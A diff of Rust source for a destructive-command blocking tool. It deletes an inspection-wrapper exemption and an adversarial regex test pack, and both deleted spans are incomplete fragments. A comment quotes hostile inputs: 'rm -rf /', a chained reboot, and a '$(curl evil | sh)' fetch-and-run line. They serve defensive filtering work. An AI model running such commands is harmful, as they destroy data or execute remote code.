@@ -2627,45 +2627,6 @@ fn trim_powershell_script_block(command: &str) -> &str {
         .unwrap_or(command)
 }
 
-    if let Some(result) = evaluate_sed_shell_sources(
-        &sed_shell_sources,
-        enabled_keywords,
-        ordered_packs,
-        keyword_index,
-        compiled_overrides,
-        allowlists,
-        heredoc_settings,
-        allow_once_audit,
-        project_path,
-        deadline,
-        &mut heredoc_allowlist_hit,
-        nested_command_depth,
-    ) {
-        return result;
-    // Built-in inspection-wrapper exemption (dcg#132).
-    //
-    // A small, hard-coded set of "inspection wrapper" prefixes
-    // (e.g. `ee preflight check --cmd`) consume the trailing destructive
-    // command as data rather than executing it. We must let them through
-    // before pack evaluation, or `dcg` will substring-match the destructive
-    // verb inside the analyzed argument and block the wrapper itself —
-    // exactly the false positive that filed dcg#132. Each prefix is
-    // evaluated by `command_prefix_safely_matches`, which enforces the
-    // same token-boundary + no-shell-chain-metacharacter guard used by
-    // user `command_prefix` allowlists. So a tail like
-    // `--cmd "rm -rf /"` allows through, but
-    // `--cmd "rm -rf /" ; reboot`, `--cmd "$(curl evil | sh)"`, etc.
-    // refuse the exemption and fall through to normal pack evaluation.
-    //
-    // We check both the raw command and the normalized form: the raw form
-    // is the agent-typed string we actually want to recognize; the
-    // normalized form is the belt-and-suspenders fallback if a future
-    // wrapper sneaks in via a path-stripped binary name.
-    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
-        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
-    {
-        return EvaluationResult::allowed();
-
 fn raw_payload_is_outer_powershell_script_block(
     words: &[&str],
     start: usize,
@@ -21434,38 +21395,6 @@ mod tests {
         );
     }
 
-            let mut safe_patterns = Vec::new();
-            for i in 0..20 {
-                safe_patterns.push(crate::packs::SafePattern {
-                    regex: crate::packs::regex_engine::LazyCompiledRegex::new(
-                        // Lookahead forces backtracking engine; nested quantifiers
-                        // cause worst-case backtracking on the adversarial input below.
-                        if i % 2 == 0 {
-                            r"(?=.*safe_cmd)(\w+\s+)*\w+"
-                        } else {
-                            r"(?=.*no_match_ever)(\w+\s+)*\w+"
-                        },
-                    ),
-                    name: "adversarial_safe",
-                });
-            }
-            let pack = Pack {
-                id: "test.adversarial".to_string(),
-                name: "adversarial",
-                description: "test pack",
-                keywords: &["rm"],
-                safe_patterns,
-                destructive_patterns: vec![crate::destructive_pattern!(
-                    "adversarial_rm",
-                    r"rm\b",
-                    "test destructive",
-                    High
-                )],
-                keyword_matcher: None,
-                safe_regex_set: None,
-                safe_regex_set_is_complete: false,
-                default_effects: crate::packs::DEFAULT_PACK_EFFECTS,
-            };
     #[test]
     fn windows_launcher_envelopes_block_destructive_commands_across_dialects() {
         use crate::normalize::ShellDialect;
